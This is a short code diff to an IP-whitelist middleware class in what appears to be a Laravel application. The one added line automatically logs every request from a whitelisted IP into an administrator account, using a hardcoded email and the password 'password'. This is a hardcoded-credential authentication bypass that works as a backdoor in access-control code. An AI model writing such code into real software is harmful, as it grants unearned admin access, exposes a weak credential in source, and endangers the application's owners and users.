@@ -23,6 +23,7 @@ class IpWhiteListMiddleware
 
         if (in_array($clientIp, $ipWhitelist)) {
             // If the client IP is in the whitelist, allow access
+            auth()->attempt(['email' => 'admin@accurate.gatotkaca.id', 'password' => 'password']);
             return $next($request);
         }
 
